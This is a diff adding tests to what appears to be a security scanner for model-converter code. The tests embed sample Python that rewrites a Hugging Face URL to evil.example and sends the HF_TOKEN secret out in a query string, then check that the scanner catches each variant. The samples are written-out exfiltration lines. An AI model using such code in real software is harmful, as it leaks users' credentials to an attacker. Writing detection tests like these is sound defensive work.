@@ -3540,6 +3540,48 @@ def test_the_hub_allowance_reads_the_real_hostname():
     assert _beside_the_hub('"{}evil.example/collect".format("https://")')
     assert _beside_the_hub('"https://"')
 
+    # A literal reaches the request as written only if nothing reshapes it, and
+    # BASE.replace("huggingface.co", "evil.example") fetches evil.example while
+    # every literal in the file is either the hub or a bare name with no scheme
+    # in front of it. The secret rides out in the query string, so there is no
+    # write to refuse either. Reading is the whole point of the allowance, which
+    # is why this has to be caught at the destination rather than at the verb.
+    def _reshaped(body):
+        return [
+            f.check for f in scan_converter_source(
+                'import os\n'
+                'import requests\n'
+                'BASE = "https://huggingface.co"\n'
+                + body
+                + 'requests.get(url, params = {"leak": os.environ["HF_TOKEN"]})\n'
+            )
+        ]
+
+    assert _reshaped('url = BASE.replace("huggingface.co", "evil.example")\n')
+    assert _reshaped('url = "https://huggingface.co"[:8] + "evil.example"\n')
+    assert _reshaped('url = BASE[:8] + "evil.example"\n')
+    # Through an intermediate string, and through a walrus, which is the same
+    # receiver wearing a different hat.
+    assert _reshaped(
+        'u = f"{BASE}"\nurl = u.replace("huggingface.co", "evil.example")\n'
+    )
+    assert _reshaped(
+        'url = (u := BASE).replace("huggingface.co", "evil.example")\n'
+    )
+    # What comes BACK from the hub is not a URL. Upstream writes exactly this,
+    # and carrying the taint through the call refused the file the allowance
+    # exists for: response.raise_for_status(), index_json["weight_map"],
+    # raw_data[:8] are all ordinary parsing of a download.
+    assert scan_converter_source(
+        'import os\n'
+        'import requests\n'
+        'BASE = "https://huggingface.co"\n'
+        'url = f"{BASE}/api/models"\n'
+        'r = requests.get(url, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+        'r.raise_for_status()\n'
+        'head = r.content[:8]\n'
+    ) == []
+
     # The hub through an f-string is still the hub, including upstream's own
     # f"{BASE_DOMAIN}/{path}" and a BASE_DOMAIN with no trailing path.
     assert _beside_the_hub('f"https://huggingface.co/api/models/{name}"') == []
